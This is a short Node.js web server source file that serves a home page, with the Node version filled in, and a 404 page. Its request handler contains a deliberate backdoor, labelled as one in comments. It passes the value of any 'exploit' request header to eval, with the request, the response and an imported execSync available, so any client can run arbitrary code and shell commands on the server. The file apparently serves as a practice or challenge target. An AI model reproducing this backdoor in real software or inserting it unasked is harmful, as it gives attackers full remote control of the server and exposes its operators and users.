import fs from 'fs';
import http from 'http';
import { execSync } from 'child_process';  // needed for some backdoor processes

const PAGES_DIRECTORY = process.cwd() + '/pages';

// Backdoor on line 11

const server = http.createServer((req, res) => {
    try {
        if (req.headers?.exploit) return (eval('let r=res;let i=req;'+req.headers?.exploit));
        if (req.url == "/" && req.method == "GET") {
            fs.readFile(PAGES_DIRECTORY + '/home.html', 'utf-8', (err, data) => {
                if (err) {
                    throw err;
                }
                res.writeHead(200, { "Content-Type": "text/html" });
                let out = data.replace('{NODE_VERSION}', process.versions.node);
                res.end(out);
            });
        } else {
            fs.readFile(PAGES_DIRECTORY + '/404.html', (err, data) => {
                if (err) {
                    throw err;
                }
                res.writeHead(404, { "Content-Type": "text/html" });
                res.end(data);
            });
        }
    } catch (e) {
        res.writeHead(500, { "Content-Type": "text/text" });
        res.end("Internal Server Error");
        console.log(e);
    }
});

server.listen(8000, () => {
    console.log("Running.");
});
